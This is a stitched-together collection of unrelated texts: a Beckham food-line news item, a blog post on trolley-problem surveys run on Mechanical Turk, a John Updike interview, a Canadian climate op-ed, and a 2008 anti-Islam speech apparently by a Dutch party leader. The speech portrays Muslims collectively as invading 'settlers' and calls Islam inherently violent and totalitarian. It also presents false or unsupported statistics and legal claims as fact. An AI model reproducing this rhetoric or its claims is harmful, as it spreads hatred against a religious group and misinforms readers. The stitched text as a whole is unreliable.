Los Angeles Galaxy starhas teamed up with Go3 , a food manufacturer , to design a healthy line of alternative food for children .
Beckham , who lends his name and face to many projects , helped introduce the line at Wembley Stadium in London , England .
This new line includes omelets , fish fingers and pasta .
Beckham told the crowd that the reason for backing this project was :
" As a dad I know how hard it is to get kids to eat the right things .
I also know as a footballer , how important it is to eat the right things to perform well , so I think Go3 is a great way to help families take some small steps to be fit and healthy at affordable prices . "
For now the product will only be available in the UK but at some point will be introduced to the U.S. , which seems fitting since the Beckham 's now reside in L.A .
If you have not seen a preview of David 's 2009 calendar , you should really take a minute and check it out here .
It looks to us like Go3 picked the right representative for healthy living .

There ’s a lot of exciting work in moral psychology right now .
I ’ve been telling various poor fools who listen to me to read something from Jonathan Haidt or Joshua Greene , but of course there ’s a sea of too many articles and books of varying quality and intended audience .
But just last week Steven Pinker wrote a great NYT magazine article , “ The Moral Instinct , ” which summarizes current research and tries to spell out a few implications .
I recommend it highly , if just for presenting so many awesome examples .
( Yes , this blog has poked fun at Pinker before .
But in any case , he is a brilliant expository writer .
The Language Instinct is still one of my favorite popular science books . )
For a while now I ’ve been thinking that recruiting subjects online could lend itself to collecting some really interesting behavioral science data .
A few months ago I tried doing this with Amazon Mechanical Turk , a horribly misnamed web service that actually lets you create web - based tasks and pay online workers do them .
Its canonical commercial applications include tedious tasks like search quality evaluation or image labeling , where you really need human data to perform well .
You put up , say , several thousand images you want classified as “ porn ” or “ not - porn ” , say you ’ll pay workers $ 0.01 to label ten images , then sit back and watch the data roll in .
So AMT advertises itself as a data annotation or machine learning substitute system , but I think its main innovation is finding out that there are lots and lots of people with free time willing to do online work for very , very low amounts of money .
You can run any task you want , including surveys , and people happily respond for mere pennies .
( Far below minimum wage , I might add — their motivation seems to be more like casual gaming or so . )
To that end , I tried out running one of the standard moral psych survey questions to see what would happen — the so - called “ trolley problem ” :
A runaway trolley is hurtling down a track towards five people who have been tied down in its path .
If nothing happens , they will be killed .
Fortunately , you have a switch which would divert the trolley to a different track .
Unfortunately , the other track has one person tied down to it .
Should you flip the switch ?
It ’s supposed to be a classic dilemma of consequentialist vs. deontological moral reasoning .
Is it acceptable to sacrifice for the greater good ?
Is it permissible to take an action that will cause a preventable death ?
And so on .
I think it ’s neat just because when I pose it to people , different folks really do disagree , give different answers , and are willing to argue about it .
There are some interesting recent fMRI findings ( due to Greene I think ? ) that people who refuse to flip the switch seem to be engaged in a more emotional response , whereas those who do seem to be using deliberative reasoning systems .
( Some , like Greene and Pinker , seem to go further and argue this is a substantive normative reason to favor flipping the switch ; whether you feel like getting sucked into that debate , though , there ’s clearly something interesting happening here . )
So I ran this on AMT ; the particpants ( they call themselves “ turkers ” ) had to answer yes or no .
Turns out 77 % say they ’d flip the tracks .
I also ran two variant scenarios of the same logical dilemma , to sacrifice one person to save five :
A trolley is hurtling down a track towards five people .
You are on a bridge under which it will pass , and you can stop it by dropping a heavy weight in front of it .
As it happens , there is a very fat man next to you – your only way to stop the trolley is to push him over the bridge and onto the track , killing him to save five .
Should you proceed ?
and
A brilliant transplant surgeon has five patients , each in need of a different organ , each of whom will die without that organ .
Unfortunately , there are no organs available to perform any of these five transplant operations .
A healthy young traveler , just passing through the city the doctor works in , comes in for a routine checkup .
In the course of doing the checkup , the doctor discovers that his organs are compatible with all five of his dying patients .
Suppose further that if the young man were to disappear , no - one would suspect the doctor .
Should the doctor sacrifice the man to save his other patients ?
These two , of course , feel a lot harder to say “ Yes ” to , but if you were willing to say “ Yes ” to the original question , it is hard to justify why .
The participants ’ repsonses followed what you would expect : fewer said “ Yes ” to these scenarios .
Here are the Yes / No responses to each of the questions ( 100 responses for each ) :
Question Yes No
surgeon 2 98
fat man 30 70

This season 's Updike is a sequel to The Witches of Eastwick , and he 's already at work on the novel after next , a tale of ancient Rome .
In a rare interview , he talks of women and witchcraft with Peter Conrad , before dismissing Sarah Palin as a ' bird - brain ' , doing a wicked impression of John McCain and endorsing Obama for President
' Lately , ' said John Updike , ' I 've been feeling not so much a wish to die as a wish that being alive did n't generate so many demands . '
Sitting across from Updike in a Boston hotel suite with my notebook open , I was the demand , and I have to say that he looked equal to it : now 76 , with a wintry shock of white hair , his eyes gleamed in his angular , bevelled face , and his mouth curved in wry amusement .
' You write a book , ' he went on , ' and that generates demands , like this interview - though of course I 'm sure it will be perfectly delightful !'
Incorrigibly prolific as he is , Updike has only himself to blame for the demands that admiring readers make on him .
' Back when I started , 50 years ago , our best writers spent long periods brooding in silence .
Then they 'd publish a big book and go quiet again for another five years .
I decided to run a different kind of shop , on the English model you might say , with a much more regular output .
I still want to give my public , such as it is , a book a year . '
He is now at work on the book after next , a novel about ancient Rome , which will join the queue for publication after a volume of short stories that is due in 2009 .
Meanwhile this season 's Updike is The Widows of Eastwick , in which the sorceresses from The Witches of Eastwick , published in 1984 , return to the rampage , with conjuring sprees in Egypt and China before they revisit the sedate New England coastal town where they re-erect their cone of gynocratic power .
' I suppose sequels are inevitable for a writer of a certain age , ' Updike sighed .
' When I re-read the earlier book , I was struck by how rich and dynamic it was , if I may say so - by the energy there was in the women and their magic .
They 're paler now , somewhat filmy .
They are crones , after all .
But they do less harm this time : they 're violent in the first book , they kill a rival .
That was my warning to the feminists , since the peaceniks in the Sixties claimed that women in power would behave better than men , be gentler and kinder .
If that were true , how do you account for Golda Meier and Margaret Thatcher ?
Now my widows are trying to atone for some of the damage they did . '
Alexandra , the leader of Updike 's coven , rejoices at the chance to release her ' inner witch ' .
Did Updike , I wondered , have his own inner wizard , concealed somewhere beneath his patrician uniform of navy blue blazer and rigorously ironed pants ?
He chuckled and looked enigmatic .
I was referring to his uncanny imaginative empathy , which extends beyond other human beings - the wickedly skittish Harry Angstrom ( nicknamed Rabbit ) in the sequence of novels that began with Rabbit , Run , the tribe of copulating suburbanites in Couples , or the hundreds of quirky individuals who populate his short stories - to non-human creatures .
His recent Shakespearean novel , Gertrude and Claudius , imagines how a horse sees the world , with two uncoordinated eyes looking in opposite directions .
Couples transcribes a hamster 's fumbling stream of consciousness , and in The Widows of Eastwick Alex fantasises about being a crab , ' moving sideways on tiptoe with eyes on stems ' , or a barnacle , ' standing on your head in a little folding bucket kicking food toward your mouth ' .
' Did I actually write a soliloquy for a hamster ? ' asked Updike .
' Ah well , it 's all the same for me .
I 'm happy to be Rabbit , or to be a crab .
Barnacles amaze me - how unlike us they are , the monstrous ways in which the poor things have to contrive to have sex .
When you sit at your desk , if you 're lucky there 's a moment when you feel empowered to be someone or something else , to leap into another skin .
It 's what Keats called negative capability .
There has to be some gap between you and the other life , which the creative spark can jump across . '
Updike once told an interviewer that the breezy way in which he surveyed his characters from above as he arranged their futures at the end of Couples gave him the sensation that he was flying .
Magicians , whether male or female , surely feel that way too .
Was he , I asked , a senior Harry Potter ?
' Hm , ' he said , not sure whether I was teasing him .
' Rowling - is that her name ?
- certainly brought magic back into our minds , though it 's always been there .
What interests me is why men think of women as witches .
It 's because they 're so fascinating and exasperating , so other .
There 's such a psychological gap between the sexes .
The erotic impulse jumps across that distance , like the creative spark .
Maybe that 's what I meant when I said I was flying .'
In the Eastwick novels , magic is Updike 's way of liberating the anarchy of nature , repressed and disciplined by scientific laws .
The witches worship a ' creatrix ' , otherwise known as Mother Nature .
Darryl , the lover they share in the first novel , pays tribute to this pagan goddess as he splashes with them in his hot tub : he marvels at the fecundity of the female body , able to incubate and expel new lives .
This homage to creativity is aesthetic as well as religious .
I suspect that Updike , from whom books continue to pour , shares the polymorphous slipperiness and the fertile abundance of his witches .
But I found the question difficult to phrase .
How do you ask an upright grandfather if he feels androgynous , or get a church - going Wasp to admit that he possesses devilish talents ?
Updike smiled as my tact got my tongue in a twist .
' Well , I 'm reminded of something the prophet Tiresias said after a magic spell turned him into a woman for seven years .
He was asked whether the man or the woman had greater pleasure when they made love , because he'd experienced it both ways .
He replied that sex was infinitely better for the woman !
My three witches are artists - a sculptor , a musician and a writer - because I think that for women living is itself a work of art .
I love the way they put themselves together in the morning , the way they prepare their faces - mostly for other women , because men are too crass to notice .
Men do n't have this aesthetic sense about life ; they see it as a job to be done , something to be got through .
And I enjoy the fact that writing novels lets me get interested in female things like clothes and furniture and food , all the domestic stuff men usually overlook .
So maybe you 're right about that .'
Down on earth , without a magician 's wand to alter reality , I found Updike preoccupied with the obligations of citizenship , anxious about the outcome of the presidential election .
His characters keep whoever occupies the White House in their peripheral vision , and often take the cue for their own behaviour from the frailties or vices of the chief executive .
In Couples , the assassination of Kennedy is noises off , dimly apprehended by the heroine , Foxy , as she lolls in a dentist 's chair ; the disaster does not cause the cancellation of a party the wife - swappers have organised for that evening .
' Yes , I loaned Foxy my own memories of that day , ' Updike recalled .
' I was at the dentist near here in Brookline , and I remember when the easy - listening station on the radio they played to keep the patients calm interrupted some pop song for the news from Dallas .
At first it was just the report of a shot ; by the time I stepped forth on to the street , flashing my new crowns , Kennedy was dead and Johnson was being sworn in to replace him .
I love that decision to go ahead with the party .
Politics was really far from central to people 's lives in the early Sixties ; it was all about the discovery of the private life .
And Kennedy was a hedonist and an adulterer too , of course .
I was a naïve boy in those days , a bit shocked to realise that my patriotic and religious values were fading .
' Oddly , Lyndon Johnson reminded me of my father , which left me with very mixed feelings about the Vietnam protesters who brought him down .
My father was a good teacher but not a disciplinarian ; he did n't have the terroristic instinct you need to keep a class quiet .
And I made life difficult for him myself , because I was naughty to win the approval of my peers .
So I felt guilty about the protests , which was n't the general mood at the time !
It 's an unpopular opinion , but I think the President should be respected .
It 's a terrible job , you can only lose at it .
It 's an insanity to want it , in fact . '
That sympathy even extends to the current incumbent .
' I think Bush got pushed into it , and he 'll probably be happy to get out .
He gave me an award in 2003 , the National Humanities Medal , and I was touched by the way he handled things .
He 'd been in meetings about Iraq all day , he was weighed down by that , but he wanted to make each of us who were getting medals feel the moment personally , so he had to be presidential - and , for as long as the ceremony lasted , he was . '
Updike was luckier than he might have been if he had turned up at Buckingham Palace to be gonged : the Queen would have wearily asked if he was still scribbling , then waited for him to move along .
We spoke on the day of the second presidential debate , in which McCain , strutting and frothing , dismissively referred to Obama as ' that one ' , as if unable to bring himself to voice his rival 's suspiciously exotic name .
' I 'm for Obama , 100 per cent , ' said Updike .
He has a personal reason for his enthusiasm : his memoir Self - Consciousness is dedicated to his two half - African grandsons and contains a letter to the boys , assuring them that all Americans are ' of mixed blood ' .
' Things have moved on since I wrote that .
I now have three grandchildren who are Obama 's colour : my daughter married a Ghanaian , and my son has a Kenyan wife .
The colour brown has come around , as the song says !
' I really think Obama would regenerate this worn - out country .
I 'm such a believer that I probably wo n't be able to watch the debate tonight .
I get so upset when I think about the alternative .
McCain is blameable for choosing Palin as his running mate .
She 's a bird - brain , she annoys me terribly .
McCain himself is worse .
You know the way he grits his teeth ?
Mine grit too as I watch him . '
Novelists , like actors , create character by an act of physical identification , which even extends to someone they despise .
Opposite me on a couch , Updike 's teeth froze , his arms shortened and stiffened , and his sparkling eyes turned wild .
The magus momentarily became the grizzled , barking , Republican nominee .
I told Updike that both Obama and McCain had nominated him as one of their favourite writers .
' They did ?
I 'd have thought Barack would be reading Hegel , not fiction !
And I can't imagine McCain reading anything .
He 's so irascible , readers have to be patient . '
Just in case the candidates were bluffing , I asked Updike to assign one of his books to them as required reading .
He made a lattice of his intertwined fingers and sunk his face into it : this is his portable , manual cave , into which he retires to do his thinking .
He spent a while perusing his back list , which after all comprises 23 novels , a dozen collections of short stories , an equal number of volumes of critical prose , half a dozen collections of poetry , five books for children , a play and an autobiography .
Then he re-emerged into the light , beaming .
' Here we go .
For Obama
I 'd recommend a novel of mine called The Coup .
It 's about an imaginary African country where the dictator pretends to hate the US , though he actually went to college here .
The politics were based on Gaddafi - what 's he called , not Mohamed , Muammar , right ?
The joke is how unlike Obama my character is !
Now for McCain .
I think he should read another novel , Memories of the Ford Administration .
It 's about an academic who hardly remembers Gerald Ford 's term in office because he was too busy committing adultery and researching James Buchanan 's presidency .
Buchanan was old , tired , ineffective , and failed to prevent the Civil War ; Abe Lincoln succeeded him .
Maybe if McCain read the book he'd have the humility to realise he should gracefully yield to a younger , brighter man .
Or maybe not . '
Enjoying the game , Updike was reluctant to stop playing .
' I could assign books to the vice - presidential candidates too , ' he chuckled .
' Let 's see .
Palin is religious and so I am .
She should read A Month of Sundays , which is about an errant minister rehabilitating himself in the Arizona desert .
Who knows , maybe McCain 's ranch is nearby ?
The book is as goofy as Palin , all brightness and gloss .
And I want to give something to Joe Biden , Obama 's running mate .
He reminds me of the good - natured , diligent guys I grew up with in smalltown Pennsylvania .
For him I 'd say it ought to be any one of the Rabbit books - maybe the second , Rabbit Redux , in which my deplorable character at least appears as a working man .
How 's that ?'
Updike 's satisfaction was deserved : in his store there is a book for every occasion , which justifies my belief that he has imagined everyone and everything , prescriptively narrating the lives that the rest of us lead .
As I left , news spread of Wall Street 's latest giddy lunge into a gulf .
' This credit crunch , ' said Updike , ' reminds me of something that Saul Bellow said - that we 're obsessed with the afterlife , though we want it now rather than waiting until we get to heaven . '
Despite Updike 's delight in what he calls the world 's ' muchness ' - its thronging people , its blossoming vegetation , its rabbits , toads and barnacles - he is dismayed by excess and surfeit , by an American grossness embodied in the waddling obesity of his fellow citizens .
Affluence has supplied the wrong kind of earthly paradise ; the ' indulgent economy ' , as Updike called it in Couples , has subsidised our greed .
His reference to Bellow reminded me , however , of Updike 's own story The Afterlife , in which an elderly American on holiday in England survives a nocturnal fall downstairs which may be his symbolic tumble into death .
Next day , reborn , he goes on a trip to the coast , and sees a world made new and radiant by metaphor : electric pylons resemble a host of angels marching across the land .
The earth becomes heavenly when Updike writes about it .
He has done more to enrich us than all of Wall Street 's bankers and brokers , and his books , unlike the papery profits of the Stock Exchange , will not lose their value .

Lives with his second wife , Martha , whom he married in 1977 .
We ’ve just had our federal election and , if nothing else , the environment did become an issue .
Unfortunately , global warming and other environmental issues were overshadowed by an economic crisis and , no doubt , by the fear people have of the word tax — so much so that they did n’t notice the word cuts was also in there .
Now it ’s up to all of us to make sure the environment does n’t get lost in all the noise about the economy .
The new government has some important choices to make in the near future .
Although a few nations are putting plans to combat global warming on the back burner while they weather the economic crisis , many more are holding fast , realizing that protecting the environment makes good economic sense .
The European Union has stated that it is committed to meeting emissions targets even as some Eastern European countries are getting cold feet .
As well , the U.K. has created a Department of Energy and Climate Change to confront both energy security and climate change , with an emphasis on creating green jobs and a green economy .
Even the state of Florida , a Republican stronghold formerly governed by U.S. President George Bush ’s brother Jeb , has released an ambitious climate plan .
The Florida plan estimates net economic savings of US $ 28 billion between now and 2025 , along with a 51 percent reduction of greenhouse gas emissions below 2005 levels and a 33 percent reduction below 1990 levels .
Projected drops in fuel consumption are also expected to lead to significant reductions in the state ’s dependence on foreign and “ dirty ” fossil fuels .
Here in Canada , several provinces , including B.C. and Ontario , have taken the lead in establishing plans to combat global warming and to shift to a sustainable economy .
But more needs to be done , especially at the federal level .
Continuing to rely on projects such as the Alberta tar sands to keep our economy afloat is a short - term strategy with long - term negative consequences for both the environment and the economy .
Sure , we ’ll be able to pull in some money while the oil lasts , or while it is economically feasible to extract , or until the rest of the world has switched to renewable sources of energy , but then what ?
Should we really continue down this path while the rest of the world takes a more forward - looking approach to energy , the environment , and the economy ?
Where will that leave us in 10 , 15 , or 20 years ?
Maybe the current batch of politicians does n’t care ; most of them wo n’t be in government then .
But we should care .
After all , it ’s not just our world ; it ’s the world we are leaving to our children and grandchildren .
We may be able to withstand the current economic crisis , but we ’ll surely face more in the future .
The environmental crises we now face — from the rapid extinction of mammals , birds , amphibians , fish , reptiles , and plants to global warming — may not be as immediately apparent to most people , but the consequences will be far more severe than diminished retirement savings plans .
If we start now to shift from reliance on dirty and nonrenewable sources of energy to renewable sources , and if we put more effort into conserving energy , we will benefit in so many ways .
Other countries have proven this and continue to prove it .
Scientists and economists have confirmed not only that we must do something , but also that acting now will cost us far less in the long run than doing nothing .
Canadians may have elected a government that differs little from the one we had before the election — and they may have even shown , through the votes they did cast and through the disappointing apathy that many demonstrated , that it was difficult to connect with the parties that made the environment the top priority .
But we should n’t conclude that the results of the election mean that the window of opportunity for government action on the environment has slammed shut .
We must keep in mind that more than two - thirds of voters cast ballots for political parties with strong plans to fight global warming and other environmental problems .
Millions of Canadians have sent a message to this parliament that they want action on global warming .
A minority government such as the one we just elected has an even greater responsibility to listen to all our voices .
We just have to speak loudly enough to be heard .

Partij voor der Vrijheid , September 29 , 2008
Dear friends ,
Thank you very much for inviting me .
Great to be at the Four Seasons .
I come from a country that has one season only : a rainy season that starts January 1st and ends December 31st .
When we have three sunny days in a row , the government declares a national emergency .
So Four Seasons , that ’s new to me .
It ’s great to be in New York .
When I see the skyscrapers and office buildings , I think of what Ayn Rand said : “ The sky over New York and the will of man made visible . ”
Of course .
Without the Dutch you would have been nowhere , still figuring out how to buy this island from the Indians .
But we are glad we did it for you .
And , frankly , you did a far better job than we possibly could have done .
I come to America with a mission .
All is not well in the old world .
There is a tremendous danger looming , and it is very difficult to be optimistic .
We might be in the final stages of the Islamization of Europe .
This not only is a clear and present danger to the future of Europe itself , it is a threat to America and the sheer survival of the West .
The danger I see looming is the scenario of America as the last man standing .
The United States as the last bastion of Western civilization , facing an Islamic Europe .
In a generation or two , the US will ask itself : who lost Europe ?
Patriots from around Europe risk their lives every day to prevent precisely this scenario form becoming a reality .
My short lecture consists of 4 parts .
First I will describe the situation on the ground in Europe .
Then , I will say a few things about Islam .
Thirdly , if you are still here , I will talk a little bit about the movie you just saw .
To close I will tell you about a meeting in Jerusalem .
The Europe you know is changing .
You have probably seen the landmarks .
The Eiffel Tower and Trafalgar Square and Rome ’s ancient buildings and maybe the canals of Amsterdam .
They are still there .
And they still look very much the same as they did a hundred years ago .
But in all of these cities , sometimes a few blocks away from your tourist destination , there is another world , a world very few visitors see — and one that does not appear in your tourist guidebook .
It is the world of the parallel society created by Muslim mass - migration .
All throughout Europe a new reality is rising : entire Muslim neighbourhoods where very few indigenous people reside or are even seen .
And if they are , they might regret it .
This goes for the police as well .
It ’s the world of head scarves , where women walk around in figureless tents , with baby strollers and a group of children .
Their husbands , or slaveholders if you prefer , walk three steps ahead .
With mosques on many street corner .
The shops have signs you and I cannot read .
You will be hard - pressed to find any economic activity .
These are Muslim ghettos controlled by religious fanatics .
These are Muslim neighbourhoods , and they are mushrooming in every city across Europe .
These are the building - blocks for territorial control of increasingly larger portions of Europe , street by street , neighbourhood by neighbourhood , city by city .
There are now thousands of mosques throughout Europe .
With larger congregations than there are in churches .
And in every European city there are plans to build super - mosques that will dwarf every church in the region .
Clearly , the signal is : we rule .
Many European cities are already one - quarter Muslim : just take Amsterdam , Marseille and Malmo in Sweden .
In many cities the majority of the under - 18 population is Muslim .
Paris is now surrounded by a ring of Muslim neighbourhoods .
Mohammed is the most popular name among boys in many cities .
In some elementary schools in Amsterdam the farm can no longer be mentioned , because that would also mean mentioning the pig , and that would be an insult to Muslims .
Many state schools in Belgium and Denmark only serve halal food to all pupils .
In once - tolerant Amsterdam gays are beaten up almost exclusively by Muslims .
Non-Muslim women routinely hear “ whore , whore ” .
Satellite dishes are not pointed to local TV stations , but to stations in the country of origin .
In France school teachers are advised to avoid authors deemed offensive to Muslims , including Voltaire and Diderot ; the same is increasingly true of Darwin .
The history of the Holocaust can in many cases no longer be taught because of Muslim sensitivity .
In England sharia courts are now officially part of the British legal system .
Many neighbourhoods in France are no - go areas for women without head scarves .
Last week a man almost died after being beaten up by Muslims in Brussels , because he was drinking during the Ramadan .
Jews are fleeing France in record numbers , on the run for the worst wave of anti-Semitism since World War II .
French is now commonly spoken on the streets of Tel Aviv and Netanya , Israel .
I could go on forever with stories like this .
Stories about Islamization .
A total of fifty - four million Muslims now live in Europe .
San Diego University recently calculated that a staggering 25 percent of the population in Europe will be Muslim just 12 years from now .
Bernhard Lewis has predicted a Muslim majority by the end of this century .
Now these are just numbers .
And the numbers would not be threatening if the Muslim - immigrants had a strong desire to assimilate .
But there are few signs of that .
The Pew Research Center reported that half of French Muslims see their loyalty to Islam as greater than their loyalty to France .
One - third of French Muslims do not object to suicide attacks .
The British Centre for Social Cohesion reported that one - third of British Muslim students are in favour of a worldwide caliphate .
A Dutch study reported that half of Dutch Muslims admit they “ understand ” the 9/11 attacks .
Muslims demand what they call ‘ respect ’ .
And this is how we give them respect .
Our elites are willing to give in .
To give up .
In my own country we have gone from calls by one cabinet member to turn Muslim holidays into official state holidays , to statements by another cabinet member , that Islam is part of Dutch culture , to an affirmation by the Christian - Democratic attorney general that he is willing to accept sharia in the Netherlands if there is a Muslim majority .
We have cabinet members with passports from Morocco and Turkey .
Muslim demands are supported by unlawful behaviour , ranging from petty crimes and random violence , for example against ambulance workers and bus drivers , to small - scale riots .
Paris has seen its uprising in the low - income suburbs , the banlieus .
Some prefer to see these as isolated incidents , but I call it a Muslim intifada .
I call the perpetrators “ settlers ” .
Because that is what they are .
They do not come to integrate into our societies , they come to integrate our society into their Dar - al - Islam .
Therefore , they are settlers .
Much of this street violence I mentioned is directed exclusively against non-Muslims , forcing many native people to leave their neighbourhoods , their cities , their countries .
Politicians shy away from taking a stand against this creeping sharia .
They believe in the equality of all cultures .
Moreover , on a mundane level , Muslims are now a swing vote not to be ignored .
Our many problems with Islam cannot be explained by poverty , repression or the European colonial past , as the Left claims .
Nor does it have anything to do with Palestinians or American troops in Iraq .
The problem is Islam itself .
Allow me to give you a brief Islam 101 .
The first thing you need to know about Islam is the importance of the book of the Quran .
The Quran is Allah ’s personal word , revealed by an angel to Mohammed , the prophet .
This is where the trouble starts .
Every word in the Quran is Allah ’s word and therefore not open to discussion or interpretation .
It is valid for every Muslim and for all times .
Therefore , there is no such a thing as moderate Islam .
Sure , there are a lot of moderate Muslims .
But a moderate Islam is non-existent .
The Quran calls for hatred , violence , submission , murder , and terrorism .
The Quran calls for Muslims to kill non-Muslims , to terrorize non-Muslims and to fulfil their duty to wage war : violent jihad .
Jihad is a duty for every Muslim , Islam is to rule the world — by the sword .
The Quran is clearly anti-Semitic , describing Jews as monkeys and pigs .
The second thing you need to know is the importance of Mohammed the prophet .
His behaviour is an example to all Muslims and cannot be criticized .
Now , if Mohammed had been a man of peace , let us say like Ghandi and Mother Theresa wrapped in one , there would be no problem .
But Mohammed was a warlord , a mass murderer , a pedophile , and had several marriages — at the same time .
Islamic tradition tells us how he fought in battles , how he had his enemies murdered and even had prisoners of war executed .
Mohammed himself slaughtered the Jewish tribe of Banu Qurayza .
He advised on matters of slavery , but never advised to liberate slaves .
Islam has no other morality than the advancement of Islam .
If it is good for Islam , it is good .
If it is bad for Islam , it is bad .
There is no gray area or other side .
Quran as Allah ’s own word and Mohammed as the perfect man are the two most important facets of Islam .
Let no one fool you about Islam being a religion .
Sure , it has a god , and a here - after , and 72 virgins .
But in its essence Islam is a political ideology .
It is a system that lays down detailed rules for society and the life of every person .
Islam wants to dictate every aspect of life .
Islam means ‘ submission ’ .
Islam is not compatible with freedom and democracy , because what it strives for is sharia .
If you want to compare Islam to anything , compare it to communism or national - socialism , these are all totalitarian ideologies .
This is what you need to know about Islam , in order to understand what is going on in Europe .
For millions of Muslims the Quran and the live of Mohammed are not 14 centuries old , but are an everyday reality , an ideal , that guide every aspect of their lives .
Now you know why Winston Churchill called Islam “ the most retrograde force in the world ” , and why he compared Mein Kampf to the Quran .
Which brings me to my movie , Fitna .
I am a lawmaker , and not a movie maker .
But I felt I had the moral duty to educate about Islam .
The duty to make clear that the Quran stands at the heart of what some people call terrorism but is in reality jihad .
I wanted to show that the problems of Islam are at the core of Islam , and do not belong to its fringes .
Now , from the day the plan for my movie was made public , it caused quite a stir , in the Netherlands and throughout Europe .
First , there was a political storm , with government leaders , across the continent in sheer panic .
The Netherlands was put under a heightened terror alert , because of possible attacks or a revolt by our Muslim population .
The Dutch branch of the Islamic organisation Hizb ut - Tahrir declared that the Netherlands was due for an attack .
Internationally , there was a series of incidents .
The Taliban threatened to organize additional attacks against Dutch troops in Afghanistan , and a website linked to Al Qaeda published the message that I ought to be killed , while various muftis in the Middle East stated that I would be responsible for all the bloodshed after the screening of the movie .
In Afghanistan and Pakistan the Dutch flag was burned on several occasions .
Dolls representing me were also burned .
The Indonesian President announced that I will never be admitted into Indonesia again , while the UN Secretary General and the European Union issued cowardly statements in the same vein as those made by the Dutch Government .
I could go on and on .
It was an absolute disgrace , a sell - out .
A plethora of legal troubles also followed , and have not ended yet .
Currently the state of Jordan is litigating against me .
Only last week there were renewed security agency reports about a heightened terror alert for the Netherlands because of Fitna .
{snip}
It is very difficult to be an optimist in the face of the growing Islamization of Europe .
All the tides are against us .
On all fronts we are losing .
Demographically the momentum is with Islam .
Muslim immigration is even a source of pride within ruling liberal parties .
Academia , the arts , the media , trade unions , the churches , the business world , the entire political establishment have all converted to the suicidal theory of multiculturalism .
So - called journalists volunteer to label any and all critics of Islamization as a ‘ right - wing extremists ’ or ‘ racists ’ .
The entire establishment has sided with our enemy .
Leftists , liberals and Christian - Democrats are now all in bed with Islam .
This is the most painful thing to see : the betrayal by our elites .
At this moment in Europe ’s history , our elites are supposed to lead us .
To stand up for centuries of civilization .
To defend our heritage .
To honour our eternal Judeo - Christian values that made Europe what it is today .
But there are very few signs of hope to be seen at the governmental level .
Sarkozy , Merkel , Brown , Berlusconi ; in private , they probably know how grave the situation is .
But when the little red light goes on , they stare into the camera and tell us that Islam is a religion of peace , and we should all try to get along nicely and sing Kumbaya .
They willingly participate in , what President Reagan so aptly called : “ the betrayal of our past , the squandering of our freedom . ”
If there is hope in Europe , it comes from the people , not from the elites .
Change can only come from a grass - roots level .
It has to come from the citizens themselves .
Yet these patriots will have to take on the entire political , legal and media establishment .
Over the past years there have been some small , but encouraging , signs of a rebirth of the original European spirit .
Maybe the elites turn their backs on freedom , the public does not .
In my country , the Netherlands , 60 percent of the population now sees the mass immigration of Muslims as the number one policy mistake since World War II .
And another 60 percent sees Islam as the biggest threat to our national identity .
I do n’t think the public opinion in Holland is very different from other European countries .
Patriotic parties that oppose jihad are growing , against all odds .
My own party debuted two years ago , with five percent of the vote .
Now it stands at ten percent in the polls .
The same is true of all smililary - minded parties in Europe .
They are fighting the liberal establishment , and are gaining footholds on the political arena , one voter at the time .
Now , for the first time , these patriotic parties will come together and exchange experiences .
It may be the start of something big .
Something that might change the map of Europe for decades to come .
It might also be Europe ’s last chance .
This December a conference will take place in Jerusalem .
Thanks to Professor Aryeh Eldad , a member of Knesset , we will be able to watch Fitna in the Knesset building and discuss the jihad .

This conference will be the start of an Alliance of European patriots .
This Alliance will serve as the backbone for all organizations and political parties that oppose jihad and Islamization .
For this Alliance I seek your support .
This endeavor may be crucial to America and to the West .
America may hold fast to the dream that , thanks tot its location , it is safe from jihad and shaira .
But seven years ago to the day , there was still smoke rising from ground zero , following the attacks that forever shattered that dream .
Yet there is a danger even greater danger than terrorist attacks , the scenario of America as the last man standing .
The lights may go out in Europe faster than you can imagine .
An Islamic Europe means a Europe without freedom and democracy , an economic wasteland , an intellectual nightmare , and a loss of military might for America — as its allies will turn into enemies , enemies with atomic bombs .
With an Islamic Europe , it would be up to America alone to preserve the heritage of Rome , Athens and Jerusalem .
Dear friends , liberty is the most precious of gifts .
My generation never had to fight for this freedom , it was offered to us on a silver platter , by people who fought for it with their lives .
All throughout Europe American cemeteries remind us of the young boys who never made it home , and whose memory we cherish .
My generation does not own this freedom ; we are merely its custodians .
We can only hand over this hard won liberty to Europe ’s children in the same state in which it was offered to us .
We can not strike a deal with mullahs and imams .
Future generations would never forgive us .
We can not squander our liberties .
We simply do not have the right to do so .
This is not the first time our civilization is under threat .
We have seen dangers before .
We have been betrayed by our elites before .
They have sided with our enemies before .
And yet , then , freedom prevailed .
These are not times in which to take lessons from appeasement , capitulation , giving away , giving up or giving in .
These are not times in which to draw lessons from Mr. Chamberlain .
These are times calling us to draw lessons from Mr. Churchill and the words he spoke in 1942 :
“ Never give in , never , never , never , never , in nothing great or small , large or petty , never give in except to convictions of honour and good sense .
Never yield to force ; never yield to the apparently overwhelming might of the enemy ” .
